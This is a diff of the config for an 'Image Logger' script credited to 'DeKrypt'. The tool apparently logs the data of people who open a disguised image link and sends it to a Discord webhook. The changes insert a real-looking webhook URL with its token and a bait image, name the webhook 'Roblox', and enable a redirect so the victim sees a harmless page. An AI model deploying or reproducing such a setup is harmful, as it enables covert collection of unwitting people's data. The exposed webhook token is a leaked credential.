@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1241433502390419466/r10U08t8Pc32866r7czyIpyYWQeQJto4iweG_7p4mFJVgquBq9CJIQ47ad7AJ8dQ_AQC",
+    "image": "https://cdn.discordapp.com/attachments/1241433182780395543/1241464873385201795/AIdro_lZcfO7j_tHuc3hSkMq7J4PvmRPrxUKQuqhcy5jV_DqMgs900-c-k-c0x00ffffff-no-rj.png?ex=664af483&is=6649a303&hm=2c40d74a0eb43066df33ff53aadb6c2de02b85590b4c5dc613d2513bcd4faf5c&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Roblox", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://youtu.be/dQw4w9WgXcQ?si=B4ATfpyPmb8U-5pi" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
